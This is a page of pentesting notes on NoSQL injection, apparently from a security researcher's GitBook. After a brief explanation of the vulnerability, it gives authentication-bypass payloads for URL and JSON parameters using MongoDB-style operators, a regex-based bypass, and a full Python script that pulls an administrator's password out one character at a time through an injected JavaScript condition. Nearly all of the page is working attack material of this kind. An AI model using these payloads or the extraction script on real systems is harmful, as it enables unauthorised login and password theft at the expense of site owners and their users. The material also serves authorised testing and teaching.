---
title: NoSQL injection
source_url: https://notes.incendium.rocks/pentesting-notes/web/injection/nosql-injection
fetched_at: 2026-09-20T01:23:21Z
license: unspecified
category: web
---
<figure><img src="https://3347686964-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2Fu7zwkkeRzjx9PZGhfY9D%2Fuploads%2F05CLUSr050Pctvl5OM7o%2Fimage.png?alt=media&amp;token=4f3eb8cc-24d9-4937-9e70-f25b8a3a4224" alt=""><figcaption></figcaption></figure>

NoSQL injection is a vulnerability where an attacker is able to interfere with the queries that an application makes to a NoSQL database. NoSQL injection may enable an attacker to:

* Bypass authentication or protection mechanisms.
* Extract or edit data.
* Cause a denial of service.
* Execute code on the server.

## Auth bypass

```
#in URL
username[$ne]=toto&password[$ne]=toto
username[$regex]=.*&password[$regex]=.*
username[$exists]=true&password[$exists]=true

#in JSON
{"username": {"$ne": null}, "password": {"$ne": null} }
{"username": {"$ne": "foo"}, "password": {"$ne": "bar"} }
{"username": {"$gt": undefined}, "password": {"$gt": undefined} }
```

### Regex to bypass

```json
{
   "username":{
      "$regex":"^admi*"
   },
   "password":{
      "$ne":"^.*"
   }
}
```

## Exfiltrate password using regex script

```python
import requests

# Base URL for the target
base_url = "https://tareget.com/user/lookup"

# Session cookie (modify this with your actual session cookie)
cookies = {
    'session': 'COOKIE_HERE',
}

# Characters to test (extend this as needed)
characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"

# Starting point for the password
password = ""

# Function to test a given prefix
def test_prefix(prefix):
    injection = f"?user=administrator'+%26%26+this.password+%26%26+this.password.match(/^{prefix}.*$/)%00"
    params = {'user': injection}
    inject = base_url + injection
    response = requests.get(inject, cookies=cookies)
    return "administrator" in response.text

# Iteratively build the password
while True:
    found_char = False
    for char in characters:
        test_pass = password + char
        if test_prefix(test_pass):
            password += char
            print(f"Found character: {char} -> Current password: {password}")
            found_char = True
            break
    if not found_char:
        print("Password extraction complete!")
        break

print(f"The password is: {password}")

```
